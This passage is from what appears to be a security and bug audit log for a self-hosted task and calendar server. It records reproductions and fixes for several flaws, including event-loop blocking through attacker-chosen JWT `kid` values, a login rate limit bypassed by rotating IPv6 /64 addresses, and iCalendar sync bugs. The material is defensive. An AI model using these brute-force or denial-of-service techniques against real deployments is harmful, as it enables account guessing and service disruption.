  mcp.validate.check_value(inf, {"type":"number"})       -> accepted
  McpApi(svc).update_day_entry("n1", day=TODAY, position=float("inf"))
    tool returned position: inf
  svc.open_day(TODAY, create=False) -> [('n1', inf)]      (persisted in day_plan.position)
  json.dumps(plan, allow_nan=False)
    -> ValueError: Out of range float values are not JSON compliant: inf   # GET /api/day/{day}
  json.dumps(McpApi(svc).today(), allow_nan=False)
    -> ValueError: Out of range float values are not JSON compliant: inf   # smylte_get_today

The write commits before the tool's own response is rendered, so the first call also
answers 500 while having succeeded — and every later read of that day 500s too.
```

</details>

**Suggested fix.** Reject non-finite floats at the one chokepoint every door passes: in
`service.patch_day_entry` (and the twin at service.py:2453 for habits), `if position is
not None: p = float(position); if not math.isfinite(p): raise ValueError("position must
be a finite number")`. Belt-and-braces: have `mcp/server.parse_body` pass a
`parse_float` that rejects non-finite results, so `1e400` cannot enter any tool
argument. A regression test should drive `smylte_update_day_entry` with `1e400` and
assert the day still reads.

#### [x] Cloudflare Access verification does a blocking JWKS fetch on the event loop, and an unknown `kid` forces one per request
`backend/tasksd/access.py:31` · **low** · bug · stage 2

`AccessVerifier.verify` is a synchronous function that performs outbound HTTPS I/O
(`PyJWKClient.get_signing_key_from_jwt` -> `urllib.request.urlopen`, PyJWT's default
`timeout=30`), and it is called directly from `async def require_auth`
(backend/tasksd/app.py:1112) rather than through `asyncio.to_thread` like every other
blocking call in the app. Worse, PyJWT's `get_signing_key` bypasses its own 300 s JWK-
set cache whenever the token's `kid` does not match a cached key: it retries with
`refresh=True`, so every request carrying an unrecognised `kid` performs a fresh network
round-trip. This is the same defect class the repo already fixed for `_href()`
("resolves the list id on the event loop while holding the global service lock"),
reintroduced on the Access path.

<details><summary>Evidence</summary>

```
backend/tasksd/access.py:30-38
```python
try:
    key = self._jwks.get_signing_key_from_jwt(token).key  # type: ignore[union-attr]
    jwt.decode(token, key, algorithms=["RS256"], audience=..., issuer=...)
```
and backend/tasksd/app.py:1106-1112
```python
async def require_auth(session=Cookie(...), cf_token=Header(...)) -> None:
    if authenticator is not None and not authenticator.verify_session(session):
        raise HTTPException(401, "authentication required")
    verifier.verify(cf_token)   # <-- blocking urlopen, inline on the loop
```
Reproduced (scratchpad/agent-scratch/probe_access.py, run against the audit copy): with `access_required=True` and `PyJWKClient.fetch_data` patched to sleep 1.5 s, a 50 ms asyncio ticker recorded `max gap between 50ms event-loop ticks: 1.55s` while a single `verify()` ran — i.e. the whole process stopped, /healthz, SSE keepalives and /api/login included.

Reproduced (scratchpad/agent-scratch/probe_kid.py): five `verify()` calls with a token whose header is `{"alg":"RS256","kid":"nope"}` produced `network fetches for 5 unknown-kid requests: 6` — the cache does not absorb a kid miss.

Failure scenario: deployment sets `TASKS_ACCESS_REQUIRED=true`. Every 300 s the JWK-set cache lapses and the next /api request synchronously fetches `https://<team>.cloudflareaccess.com/cdn-cgi/access/certs`; if that endpoint or DNS stalls, the entire app is frozen for up to 30 s. Separately, any caller past the session check (or any caller at all, when `TASKS_AUTH_ENABLED=false` leaves Access as the only gate, since `authenticator is None` short-circuits the first check) can send `Cf-Access-Jwt-Assertion` with a random `kid` and make every one of its requests do a blocking outbound fetch, serialising the whole server behind them.
```

</details>

**Suggested fix.** Make `verify` awaitable (or call it via `asyncio.to_thread` from `require_auth`) so the
JWKS fetch never runs on the event loop, and bound the kid-miss refresh (e.g. cache
negative kids for a short interval, or pre-warm the JWK set on a background task) so an
attacker-chosen `kid` cannot force a network round-trip per request.

**Pinned by** `test_an_unknown_kid_does_not_buy_a_jwks_fetch_per_request` + `test_verifying_an_access_token_does_not_freeze_the_event_loop` in `backend/tests/test_backlog_aug25_stage2.py`.

**Fixed** in both halves, and the second is NOT the shape the suggested fix leads with.

`verify` is now `async def` and does its work through `asyncio.to_thread`, so the JWKS fetch never runs on the loop; `require_auth` awaits it. Eight synchronous call sites in the test suite were wrapped in `asyncio.run(...)` with every assertion unchanged — an API-shape change, which the loop-blocking pin's own docstring anticipated ("offloading to a thread and going async are both correct repairs").

**The kid bound had to go on the FETCH, not on the kid**, and the first attempt at this fix got that wrong. A per-`kid` negative cache is the obvious reading of "cache negative kids for a short interval" and it buys exactly nothing: `kid` is a header field the caller writes, so the attacker never repeats one — measured, still one fetch per request across ten distinct kids. What is bounded instead is how often the key set may be fetched at all: `AccessVerifier` keeps its own key set with a 300 s TTL and refuses to go to the wire more than once per 60 s, and PyJWT's two-tier lookup is reimplemented over its own primitives (`get_signing_keys`, `match_kid`) so that both tiers answer to that clock and nothing about how the set is fetched changes.

Two consequences worth writing down. The clock is stamped on every ATTEMPT rather than every success, because an unreachable endpoint is otherwise its own amplifier — no set is ever cached, so every request tries again; the cost is that for up to a minute after an outage clears a legitimate token is still refused, which fails CLOSED on a layer whose fallback is the session cookie. And a token with no readable `kid` is refused before any fetch, since no refresh could produce a match for it.

A CONTROL was added: a good token must still verify while the cooldown is running, without costing another fetch. The over-correction here is a verifier that refuses everything for a minute after any miss, which would satisfy the pin by turning Access into a wall — confirmed by mutation that this control is the only thing that catches it.

#### [x] Nothing bounds the total anonymous scrypt work: the login limiter is keyed only on the client /64, so a single routed /48 lifts "5 guesses / 15 min" to ~6 M/day
`backend/tasksd/app.py:1711` · **low** · security · stage 2

The only gate in front of `/api/login`'s scrypt call is
`authenticator.limiter.attempt(key)` where `key = limiter_key(_client_ip(request))`,
i.e. a per-source-/64 counter. `login_hashes = asyncio.Semaphore(4)` bounds
*concurrency* (memory), never *rate*. There is no global failure counter and no global
budget on hash work, so the real ceiling on password guesses is the box's CPU, not the
advertised 5-per-15-minutes. auth.py's module docstring ("the slow hash + rate limit
make online brute force impractical") and `limiter_key`'s docstring ("an attacker
rotating through their own 2^64 addresses shares one counter") are both true per address
and false in aggregate: the /64 collapse only defeats rotation *inside* one allocation,
and an attacker with a routed /48 has 65 536 independent counters.

<details><summary>Evidence</summary>

```
backend/tasksd/app.py:1701-1727
```python
login_hashes = asyncio.Semaphore(4)
...
key = limiter_key(_client_ip(request))   # IPv6 collapses to its /64
if not authenticator.limiter.attempt(key):
    raise HTTPException(429, ...)
async with login_hashes:
    ok = await asyncio.to_thread(authenticator.check_credentials, body.username, body.password)
```
with `RateLimiter(max_fails=5, window_s=900, lockout_s=900)` (backend/tasksd/auth.py:90) and `limiter_key` collapsing IPv6 to /64 (backend/tasksd/auth.py:61-76). Grep confirms no other limiter, middleware or edge config gates this route: `tasksd/limits.py` only caps body size, and `deploy/Caddyfile.snippet` sets `request_body max_size 1MB` and no rate limit.

Measured in the audit copy: `verify_password` costs 56.4 ms per call (scrypt N=2^14, r=8, p=1). With the semaphore at 4, the process will evaluate ~4/0.0564 = 71 guesses/second forever = ~6.1 million/day. Sustaining that needs only ~860 distinct source /64s held in rotation (71 req/s x 900 s window / 5 per key) — one Hurricane-Electric-style free /48 supplies 65 536.

Failure scenario: attacker with one routed /48 opens 4 concurrent POST /api/login, cycling a fresh /64 every 5 guesses. Every request passes `attempt()` (fresh key), so ~6.1 M passwords/day are actually evaluated against a limit advertised as 5 per 15 minutes, and the box permanently runs 4 memory-hard scrypt threads (16 MiB each) out of the shared default executor — sustained 100% CPU on a Pi/small VPS, with the owner's own requests competing for what is left.
```

</details>

**Suggested fix.** Add a second, key-independent counter in front of the hash: a global token bucket (or a
global failure counter with its own lockout) on `/api/login` and `/oauth/authorize`,
sized to what a real single-owner deployment needs (a few attempts a minute). Keep the
per-/64 limiter as the per-client layer; the global one is what makes address rotation
useless.

**Pinned by** `test_the_anonymous_guess_budget_is_bounded_across_client_addresses` in `backend/tests/test_backlog_aug25_stage2.py`.

**Fixed** with the suggested fix's shape — a second, key-independent bound in front of the hash, on `/api/login` and `/oauth/authorize` both — as a TOKEN BUCKET rather than the global failure counter the entry offers as an alternative, and the difference is the point.

A global counter with a lockout is itself a denial of service: it has no key to exempt the owner by, so an attacker who burns it locks the account holder out for the whole window. `HashBudget` throttles instead — capacity 10, one token per 10 s, so ~6 sustained guesses a minute against the ~71/s the CPU allowed — and the worst an attacker can do to the owner is a few seconds' wait.

**A verified password hands its token back**, which is what makes this a GUESS budget rather than a login budget: the owner signing in from three devices, or restarting a client, costs nothing. One token, not a reset — `RateLimiter.record_success` clears its counter outright and `release`'s docstring already records what that cost when it was used to undo a single reservation; handing back the whole budget here would let an attacker alternate a known-good password with guesses and never run out.

The bucket is charged AFTER the per-client limiter, and the order is load-bearing: a client already over its own allowance must be turned away by its own counter rather than spending from the shared pool.

Measured after: **200 requests from 40 addresses spend 10 hashes**, where they spent 200. The two existing lockout tests are `@pytest.mark.radicale` and could not run here, so their contracts were driven in-process against the real app instead — five wrong passwords still 401 then 429 with a Retry-After, 60 concurrent guesses still evaluate exactly five, three fumbles then the right password still gets in. A control was added for the one thing nothing covered: 25 correct logins in a row must all succeed.

#### [x] Test gap: AccessVerifier and the whole access_required posture have zero coverage, including the third fail-closed startup refusal
`backend/tests/test_security.py:418` · **low** · test-gap · stage 5

`backend/tasksd/access.py` is a security control with no test of any kind. Grepping the
entire suite, `access_required` appears only as `False` inside settings fixtures;
nothing constructs an `AccessVerifier`, nothing drives `require_auth` with Access on,
and nothing asserts the JWKS failure mode. test_security.py has a dedicated "fail-closed
at startup" section that explicitly exists because "a refactor that reordered the
password fallback, or dropped the well-known-default comparison, would have left the
whole suite green with the gate gone" — and it covers two of the three refusals in
`create_app`. The Access one (app.py:920, `TASKS_ACCESS_REQUIRED is set but
TASKS_ACCESS_TEAM_DOMAIN / TASKS_ACCESS_AUD are not configured — refusing to start
unprotected`) is the third, and it is not tested.

<details><summary>Evidence</summary>

```
```
$ grep -rn "AccessVerifier|access_required=True|Cf-Access|unprotected" backend/tests/
(no matches; access_required appears only as `access_required=False` in six settings fixtures)
```
Uncovered behaviours, all of which currently work and all of which fail open or brick the app if broken:
  * `verify(None)` -> 401, `verify("garbage")` -> 403, `verify(<alg=none token>)` -> 403 (confirmed by hand: 401 "missing Cf-Access-Jwt-Assertion"; 403 "invalid Access token: Not enough segments"; 403 "Unable to find a signing key that matches").
  * A JWKS fetch failure must fail CLOSED. It does today (`except Exception -> 403`), but nothing pins it: widening that handler, or adding a `return` for the connection-error case to "avoid locking people out during an outage", would silently turn Access into a no-op and leave the suite green.
  * `access_required=False` must make `verify` a total no-op even with a garbage header.
  * `create_app(access_required=True, access_team_domain="", access_aud="")` must raise RuntimeError.

Failure scenario the gap permits: someone "fixes" the 403-on-outage behaviour by returning early when `PyJWKClientConnectionError` is raised. Every /api request then passes the Access gate with any token at all, or none, and `pytest -q` is still green.
```

</details>

**Suggested fix.** Add unit tests for `AccessVerifier` with `access_required` both off and on, using a
monkeypatched `PyJWKClient.fetch_data` that serves a locally generated RSA JWK set:
assert the no-op path, the 401 on a missing header, the 403 on a bad signature / wrong
aud / wrong iss / expired token, the 403 (not a pass) when `fetch_data` raises, and a
plain `pytest.raises(RuntimeError, match="refusing to start unprotected")` for the third
startup invariant alongside the two already there.

**Covered by** twelve tests in `backend/tests/test_backlog_aug25_stage5.py`: the off-path no-op, the 401 on a missing header, a valid assertion passing, 403 for a wrong `aud`/`iss`/expiry, 403 for an unparseable or `alg=none` token, `test_a_jwks_outage_fails_closed`, and `test_access_required_without_its_configuration_refuses_to_start` for the third startup refusal beside the two `test_security.py` already covers.

**Closed on REVIEW, same as its sibling.** The posture was correct; nothing tested it. The twelve tests were confirmed against three mutations — the sympathetic `except PyJWKClientConnectionError: return` (an outage turning the edge gate into a no-op), the `access_required` startup guard removed, and `decode(..., options={"verify_aud": False, "verify_iss": False})`. Each fails exactly the tests it should and nothing else.

The first is the one worth reading twice: Access fails closed today only because `except Exception` happens to catch `PyJWKClientConnectionError` along with everything else, and before this file `pytest -q` had nothing to say about it. `verify` has since become `async` (stage 2's loop-blocking fix) and these tests moved with it; the fail-closed assertion is unchanged.

**NOT a pin**, for the same reason: every one of these behaviours already works. Each was confirmed against the regression it guards — `except PyJWKClientConnectionError: return` (the sympathetic outage "fix" this entry names) makes the outage test the only failure in the suite; disabling the `access_required` guard in `create_app` fails all three startup cases; and `options={"verify_aud": False, "verify_iss": False}` fails exactly the two cases that tie an assertion to this app and this tenant.

#### [x] PATCH /api/day/{day}/entries/{id} mints an unreclaimable sidecar row when the entry's task no longer exists — the same permanent leak the PUT-sidecar and reorder doors were both hardened against
`backend/tasksd/service.py:2321` · **low** · bug · minor · stage 2

`patch_day_entry` write-throughs an estimate onto the task's sidecar: ```python if
("estimate_minutes" in fields and row["kind"] == "task" and row["collection_href"] and
row["uid"]): store.set_sidecar( self._conn, row["collection_href"], row["uid"],
estimated_minutes=fields["estimate_minutes"], ) ``` `row` is a `day_plan` entry, and day
entries are *designed* to outlive the task they name — `_carry_into`'s docstring says so
explicitly ("a task entry whose task is no longer an open VTODO stays behind too —
completed elsewhere, cancelled, or gone from the wire entirely. The ENTRY on its own day
survives all of that (no FK, by design)"). So `row["uid"]` routinely names a UID that
`items` no longer holds, and there is no existence check on this path.
`store.set_sidecar` (store.py:506) does a bare `INSERT OR IGNORE INTO sidecar
(collection_href, uid)` with no referential check, so it creates a fresh row with
`orphaned_at IS NULL`. `orphan_sidecar` (store.py:445) only ever UPDATEs rows that
already exist at the moment a *known* item is removed, and `gc_orphans` (store.py:477)
deletes only `orphaned_at IS NOT NULL`. The row is therefore permanent, in the one table
the codebase repeatedly calls "the one part of the DB no resync can rebuild". This is
exactly the leak two other doors were already fixed for. `PUT
/api/lists/{id}/tasks/{uid}/sidecar` got a `has_task` guard and a nine-line comment
about it (app.py:1294-1305), and `store.set_sort_orders` got an `INSERT ... SELECT ...
WHERE EXISTS (SELECT 1 FROM items ...)` guard whose docstring says "The guard belongs
here, where every door passes" (store.py:536-546). The guard was put in
`set_sort_orders`, not in `set_sidecar`, so this third door — added later with the day-
plan/estimate feature — still passes unguarded.

<details><summary>Evidence</summary>

```
Reproduced against the audit copy:

```python
store.upsert_item(conn, "/u/work/", Item("/u/work/gone@x.ics", '"1"', raw), extract_from_raw(raw))
svc.add_day_entry(TOMORROW, entry_id="e1", kind="task", list_id="work", uid="gone@x")
# another CalDAV client deletes the task; sync removes the item and orphans any sidecar
store.delete_item_by_href(conn, "/u/work/", "/u/work/gone@x.ics")
store.orphan_sidecar(conn, "/u/work/", "gone@x")
svc.patch_day_entry(TOMORROW, "e1", estimate_minutes=45)
```

Output:
```
sidecar rows after delete: 0
sidecar rows after estimating the entry: [('/u/work/', 'gone@x', 45, None)]   # orphaned_at = None
item exists? False
gc_orphans reclaims: 0
still there: 1
```

Concrete scenario: the owner plans "Buy milk" onto tomorrow from the Today tab; later that evening they tick it off in Tasks.org (or DAVx5 deletes it), so the VTODO leaves the wire and `items`. The day entry survives by design and is still on tomorrow's plan. The owner opens Today, types an estimate on that row -> PATCH with `estimate_minutes` -> a sidecar row for `gone@x` is created with `orphaned_at IS NULL`. `orphan_sidecar` will never fire for it (the item is already gone, so no future removal names it) and `gc_orphans` skips it forever. Repeat over months of planning and the sidecar table accumulates rows that no resync, no GC and no UI can reach.
```

</details>

**Suggested fix.** Give `store.set_sidecar` the same `WHERE EXISTS (SELECT 1 FROM items WHERE
collection_href=? AND uid=?)` guard that `set_sort_orders` already carries — that closes
every current and future door at once, and is what that function's own docstring argues
for. Failing that, guard at this call site: only teach the sidecar when
`store.get_item(self._conn, row["collection_href"], row["uid"]) is not None`, leaving
the day entry's own `estimate_minutes` write unconditional (the entry is what the day
counts; the sidecar is only where the *next* entry starts). A test that estimates a day
entry whose task has been removed and then asserts `SELECT COUNT(*) FROM sidecar == 0`
would pin it.

**Pinned by** `test_estimating_a_day_entry_whose_task_is_gone_leaves_nothing_behind` in `backend/tests/test_backlog_aug25_stage2.py`.

**Fixed** in `store.set_sidecar` rather than here, which is the half of the suggested fix this entry and its twin agreed on. The call site is unchanged: `patch_day_entry` still write-throughs the estimate, and the write is now a no-op when `items` does not hold the uid. The entry's OWN `estimate_minutes` still lands — that is `update_day_entry`, a different table with no FK either way — so the row the owner is looking at shows the number they typed and only the teach-the-task half is skipped, which is the correct outcome for a task that no longer exists.

#### [x] store.set_sidecar has no live-item guard, so the day-plan estimate write-through mints sidecar rows gc_orphans can never reclaim
`backend/tasksd/db/store.py:511` · **low** · bug · minor · stage 2

`set_sidecar` unconditionally does `INSERT OR IGNORE INTO sidecar (collection_href, uid)
VALUES (?, ?)` for any uid at all. The project has already closed this exact hole at the
other two doors into that table — `PUT /api/lists/{id}/tasks/{uid}/sidecar` got a
`has_task` check (app.py:1296-1305, with a nine-line comment about it) and `POST
/api/tasks/reorder` got an `EXISTS (SELECT 1 FROM items …)` guard inside
`store.set_sort_orders` (store.py:558-566, whose docstring says "The guard belongs here,
where every door passes"). A third door passes and has no guard:
`service.patch_day_entry` (service.py:2319-2323) writes the estimate through to the
sidecar for any day_plan TASK entry. day_plan deliberately has NO foreign key to `items`
— schema.sql:293-297 says the entry "must stay true even after the task it names is
completed-and-deleted, moved between lists by another client, or delete-and-recreated by
a sync" — and `service.add_day_entry` validates only that the LIST resolves, never that
the uid names a live item (`CreateDayEntry.uid` is free text, max 512; the MCP
`smylte_plan_day` `uid` is `{"type": "string"}` with no constraints at all). So the
(collection_href, uid) pair reaching `set_sidecar` routinely names nothing.
`orphan_sidecar` only stamps `orphaned_at` at the moment a KNOWN item leaves the wire,
and `gc_orphans` deletes only `WHERE orphaned_at IS NOT NULL`. A row minted after that
moment (or for a uid that never existed) has `orphaned_at IS NULL` forever and is
unreclaimable, in the one table a resync cannot rebuild.

<details><summary>Evidence</summary>

```
store.py:511-521:
    conn.execute(
        "INSERT OR IGNORE INTO sidecar (collection_href, uid) VALUES (?, ?)",
        (collection_href, uid),
    )
    for k, v in fields.items():
        conn.execute(f"UPDATE sidecar SET {k}=?, …")

service.py:2319-2323:
    if ("estimate_minutes" in fields and row["kind"] == "task"
            and row["collection_href"] and row["uid"]):
        store.set_sidecar(self._conn, row["collection_href"], row["uid"],
                          estimated_minutes=fields["estimate_minutes"])

Reproduced (backend/.venv/bin/python, TaskService with db_path=':memory:'):
  seed VTODO 'due-today' in /u/work/; svc.open_day(DAY, create=True)
  -> the phone deletes the task: store.delete_item_by_href(...); store.orphan_sidecar(...)
     item gone: None ; sidecar after delete: None   (nothing to orphan)
  -> the owner estimates the still-visible day entry:
     svc.patch_day_entry(DAY, entry_id, estimate_minutes=25)
     sidecar after patch: {'collection_href': '/u/work/', 'uid': 'due-today', …,
                           'estimated_minutes': 25, 'orphaned_at': None}
  -> store.gc_orphans(conn, '/u/work/', keep_days=-3650) deleted: 0
     still present: True

Second, cheaper trigger needing no deletion at all: POST /api/day/{day}/entries
{"entry_id":"x","kind":"task","list":"<real list>","uid":"anything-at-all"} then
PATCH /api/day/{day}/entries/x {"estimate_minutes":30} — one permanent row per
call. The same pair of MCP tools (smylte_plan_day + smylte_update_day_entry) reaches it from an LLM.
```

</details>

**Suggested fix.** Move the guard into `store.set_sidecar`, exactly as `set_sort_orders` did, so every door
passes it: replace the `INSERT OR IGNORE … VALUES (?, ?)` with `INSERT INTO sidecar
(collection_href, uid) SELECT ?, ? WHERE EXISTS (SELECT 1 FROM items WHERE
collection_href=? AND uid=?) ON CONFLICT(collection_href, uid) DO NOTHING`, and skip the
UPDATE loop when no row exists. (A caller-side `has_task` check in
`service.patch_day_entry` closes this one door but leaves the store primitive open for
the next caller.) Add a unit test beside
`test_a_reorder_naming_an_unknown_uid_writes_no_sidecar_row` asserting that estimating a
day entry whose task is gone leaves the sidecar count unchanged.

**Pinned by** `test_a_sidecar_is_not_minted_for_an_item_the_cache_does_not_hold` in `backend/tests/test_backlog_aug25_stage2.py`.

**Fixed** with the suggested fix, taken verbatim from `set_sort_orders`: `INSERT INTO sidecar (collection_href, uid) SELECT ?, ? WHERE EXISTS (SELECT 1 FROM items WHERE collection_href=? AND uid=?) ON CONFLICT(collection_href, uid) DO NOTHING`. One deliberate addition — **the per-field UPDATEs carry the same `EXISTS` clause**, not just the INSERT. `set_sort_orders`' `ON CONFLICT … DO UPDATE` never fires when its `WHERE EXISTS` produced no row, so mirroring it properly means an absent item writes nothing at all, including to a row that is already there and already orphaned; without that, estimating a dead task would still stamp `updated_at` and `estimated_minutes` onto a row on its way out.

The route-level `has_task` guard at `app.py` STAYS, and its comment now says why: the store closed the row half, but the guard is still what makes `PUT …/sidecar` answer 404 for an unknown uid instead of 200 with a body of `null`, which `test_api.py` asserts alongside the row count.

Four `test_sync_unit.py` tests minted a sidecar row for a uid that was never in `items` — `_orphan_aged` and `test_gc_orphans_never_touches_a_live_row`. They are gc_orphans tests and the shortcut was never their point, so they now seed the item first; `_orphan_aged` additionally DELETES it before stamping, which is the sequence a real orphan actually follows.

#### [x] tx() replaces the real exception with "cannot rollback - no transaction is active" whenever SQLite has already auto-rolled back (disk full / I/O error)
`backend/tasksd/db/store.py:43` · **low** · bug · minor

`tx`'s failure arm issues an unconditional `conn.execute("ROLLBACK")`. For error classes
where SQLite performs an automatic rollback — SQLITE_FULL and SQLITE_IOERR being the
realistic ones on a self-hosted box whose disk fills up — the transaction is already
gone by the time the handler runs, so the ROLLBACK itself raises
`sqlite3.OperationalError: cannot rollback - no transaction is active`. That exception
propagates in place of the original; the `raise` on the next line never executes. The
data is safe (SQLite really did roll back), but the diagnosis is destroyed at exactly
the moment it is needed. `SyncEngine._apply_incremental` / `full_resync` / `discover`
all run inside `tx`, and `service.sync_all` catches the escaping exception and does
`log.warning("sync failed for %s: %s", href, e)` plus `store.set_sync_error(self._conn,
href, str(e))` — so both the log line and the persisted `sync_state.last_error` the
operator reads say "cannot rollback - no transaction is active" when the actual
condition is "database or disk is full". There is also no unit test of `tx` at all; the
only test of its all-or-nothing behaviour (test_backlog_aug19_stage1.py:262) is
`@pytest.mark.radicale` and skips without Docker.

<details><summary>Evidence</summary>

```
store.py:39-47:
    conn.execute("BEGIN IMMEDIATE")
    try:
        yield
    except BaseException:
        conn.execute("ROLLBACK")      # <- raises when SQLite already rolled back
        raise
    else:
        conn.execute("COMMIT")

Reproduced (backend/.venv/bin/python, file-backed DB via store.connect, WAL):
    conn.execute("PRAGMA max_page_count=%d" % (page_count + 5))   # simulates SQLITE_FULL
    with store.tx(conn):
        for i in range(500):
            conn.execute("INSERT INTO blobs (b) VALUES (?)", (os.urandom(4000),))
  ->  failure point: ('statement', 'OperationalError', 'database or disk is full')
  ->  tx raised:     OperationalError cannot rollback - no transaction is active
  ->  conn.in_transaction after tx(): False   (SQLite had already rolled back)

So the caller — and sync_state.last_error, and the log — are told about a rollback
bookkeeping detail instead of the full disk.
```

</details>

**Suggested fix.** Swallow a failed ROLLBACK so the original exception survives: except BaseException: try:
conn.execute("ROLLBACK") except sqlite3.Error: pass # SQLite already rolled this back
(SQLITE_FULL/IOERR) raise While there, consider guarding the COMMIT the same way (a
COMMIT that raises currently leaves the connection inside a transaction it never
closes). Add a plain unit test for `tx`: one asserting an ordinary exception rolls the
batch back, and one under `PRAGMA max_page_count` asserting the disk-full message is
what reaches the caller.

### iCalendar, DAV, MCP

#### [x] split_series replaces a bounded rule's own end with `anchor - 1s`, so "this and following" on an RDATE past the rule's end resurrects every slot in between
`backend/tasksd/ical/edit.py:1572` · **high** · bug

The head of a split is rebounded unconditionally: ```python rule = _rrule_dict(hmaster)
_require_occurrence(hmaster, rule, anchor) if rule is not None: rule.pop("COUNT", None)
rule["UNTIL"] = [_until_before(anchor)] _set_rrule(hmaster, rule) ``` This assumes the
anchor is a slot the RRULE itself generates, so that `UNTIL = anchor - 1s` can only
narrow it. But `_require_occurrence` deliberately accepts an anchor named by an
**RDATE** (`if any(_same_instant(_period_start(r), anchor) for r in rdates): return`),
and an RDATE routinely sits *after* where the rule stopped — that is the normal reason
to add one ("the weekly run ended in January, plus one extra session in March"). When it
does, dropping COUNT and writing a later UNTIL **extends** the rule instead of cutting
it, and every day/week between the rule's real end and the anchor becomes a live
occurrence. A split can only ever narrow a series; the bound has to be clamped
(`min(existing, anchor-1s)`), never replaced. Note the same block leaves the tail
carrying the original `UNTIL`, which now precedes the tail's own `DTSTART` — the
"undeletable husk" shape `_head_is_empty` exists to prevent, on the other side of the
split.

<details><summary>Evidence</summary>

```
Reproduced against the audit copy with `expand_occurrences` as the judge.

Resource (any client can write it; the SPA renders 4 occurrences):
```
DTSTART:20260105T090000Z
DTEND:20260105T093000Z
RRULE:FREQ=DAILY;COUNT=3
RDATE:20260210T090000Z
```
Occurrences before: 2026-01-05, 01-06, 01-07, 02-10 (4).

`split_series(raw, "2026-02-10T09:00:00+00:00", EventEdit())` →
```
head RRULE: RRULE:FREQ=DAILY;UNTIL=20260210T085959Z
head occurrences: 36  (2026-01-05 ... 2026-02-09, daily)
tail occurrences: 1   (2026-02-10)
```

Identical with an UNTIL-bounded rule: `RRULE:FREQ=DAILY;UNTIL=20260107T090000Z` + the same RDATE also yields a 36-occurrence head.

Reachable in two clicks. `app.py:delete_event` with `scope="thisandfuture"` → `service.delete_event` line 937 → `engine.split_event(..., delete_tail=True)`, which PUTs **only the head**: the owner asks to delete one occurrence and 33 events they never created are written to the shared Radicale collection permanently (and start blocking the public booking page). The tail also comes out as `DTSTART:20260210T090000Z` beside `RRULE:FREQ=DAILY;UNTIL=20260107T090000Z` — an UNTIL before its own DTSTART.
```

</details>

**Suggested fix.** Clamp instead of replacing. Keep the rule's existing bound when it already ends before
the anchor: compute the head's UNTIL as the earlier of the current UNTIL and
`_until_before(anchor)`, and only `pop("COUNT")` when the anchor is a slot the RRULE
generates (`_require_occurrence` already distinguishes the RDATE-named case — have it
report which branch matched). When the anchor came from an RDATE beyond the rule's
reach, leave RRULE untouched and let the RDATE partition alone do the split. Apply the
same clamp to the tail's rule so it cannot keep an UNTIL earlier than its new DTSTART.

#### [x] `_detach_thisandfuture` subtracts `nxt - anchor` with none of the mixed-type/awareness tolerance every other datetime helper in the file has — unhandled TypeError (500)
`backend/tasksd/ical/edit.py:904` · **high** · bug

```python nxt = _next_generated(master, anchor, blocked=_claimed_anchors(cal,
exclude=governing)) ... step = nxt - anchor ``` `_next_generated` normalizes only the
values dateutil produced (lines 828-830 re-attach `after.tzinfo` and downcast to
`.date()` when the anchor is a date). The `extra` list — the master's RDATEs, added at
line 831 — is passed straight through, so `nxt` can be a floating datetime beside a
zone-aware anchor, or a datetime beside a date anchor. `nxt - anchor` then raises
TypeError. TypeError is neither ValueError nor OverflowError, so `patch_event`
(app.py:1523/1526) does not map it and there is no generic exception handler on the app
— it escapes as a **500**. Every other datetime site in this file was given exactly this
guard for exactly this reason: `_same_instant` (line 622), `_at_or_after` (line 646),
`_comparable` (line 439), `_tf_shift` (line 1397), `_event_duration` (line 671),
`_wall_delta` (line 1018). This is the one arithmetic left raw, and it sits on the "edit
this occurrence" path.

<details><summary>Evidence</summary>

```
Two shapes, both hitting line 904, found by sweeping the five write entry points over foreign-ICS shapes:

**A — floating RDATE beside a zoned master** (the file's own `_rebuild_datelist` docstring calls mixed zones "ordinary in a shared collection"):
```
DTSTART;TZID=Europe/Berlin:20260105T090000
DTEND;TZID=Europe/Berlin:20260105T100000
RRULE:FREQ=DAILY;COUNT=3
RDATE:20260210T090000
---
RECURRENCE-ID;RANGE=THISANDFUTURE:20260107T090000Z
DTSTART:20260107T110000Z
DTEND:20260107T120000Z
```
`apply_occurrence_override(raw, "2026-01-07T09:00:00+00:00", EventEdit(summary="x"))` →
`TypeError: can't subtract offset-naive and offset-aware datetimes` at `edit.py:904`.
The rule's COUNT is exhausted at the anchor, so `_next_generated` falls through to the floating RDATE.

**B — DATE-valued RANGE=THISANDFUTURE override on a series whose RDATEs are DATE-TIME:**
```
DTSTART:20260105T090000Z
DTEND:20260105T100000Z
RDATE:20260107T090000Z,20260109T090000Z
---
RECURRENCE-ID;RANGE=THISANDFUTURE;VALUE=DATE:20260107
DTSTART;VALUE=DATE:20260108
```
`apply_occurrence_override(raw, "2026-01-07", ...)` →
`TypeError: unsupported operand type(s) for -: 'datetime.datetime' and 'datetime.date'`.

Both are Apple/Thunderbird "this and all future events" shapes the repo explicitly supports. The occurrence is then permanently uneditable via "this event" (the bytes live on the server), and the owner gets a 500 with no message. Via MCP the same crash surfaces as `smylte_update_event rejected those arguments: can't subtract offset-naive and offset-aware datetimes`.
```

</details>

**Suggested fix.** Normalize the RDATE-sourced candidates in `_next_generated` the way the rrule candidates
already are — coerce each `extra` entry to the anchor's dateness and awareness before it
enters `slots` — and/or compute the step in `_detach_thisandfuture` through the existing
tolerant helpers (`_comparable(nxt, anchor)` then subtract, mirroring `_wall_delta`).
Add a regression case for each of the two shapes above.

#### [x] An out-of-range SEQUENCE from any CalDAV client permanently stalls that collection's sync
`backend/tasksd/ical/read.py:301` · **high** · bug

`_int` converts a property icalendar has already flagged as broken into an unbounded
Python int, and `extract` puts it in `ItemFields.sequence` (read.py:341).
`store.upsert_item` binds that to a SQLite INTEGER column, which is 64-bit, so a
SEQUENCE above 2**63 raises OverflowError. That bind sits OUTSIDE the `try/except
Exception` in `sync/engine.py:243-251`, which only guards `ical.extract_from_raw` —
`store.upsert_item` is at engine.py:256, after the guard closes. The OverflowError
therefore aborts the whole `_tx` in `_apply_incremental`/`full_resync`, so the sync
token is never advanced and every item in the same batch is rolled back. `sync_all`
(service.py:402) catches it, records a sync error and moves on — and the next pass re-
fetches the identical poison href with the identical old token and fails identically,
forever. The collection stops receiving ANY change from ANY client. This is the same
class as the already-fixed calendar-order overflow, but at a different site: that one
was closed by clamping at the wire boundary in `dav/client.py:163-166` ("Python ints are
unbounded but SQLite's INTEGER is not"); the item-level twin was never bounded. PRIORITY
and PERCENT-COMPLETE are safe only by accident — icalendar range-checks those and raises
ValueError inside `extract`, which the guard does catch; SEQUENCE comes back as a
`vBroken` whose `int()` succeeds.

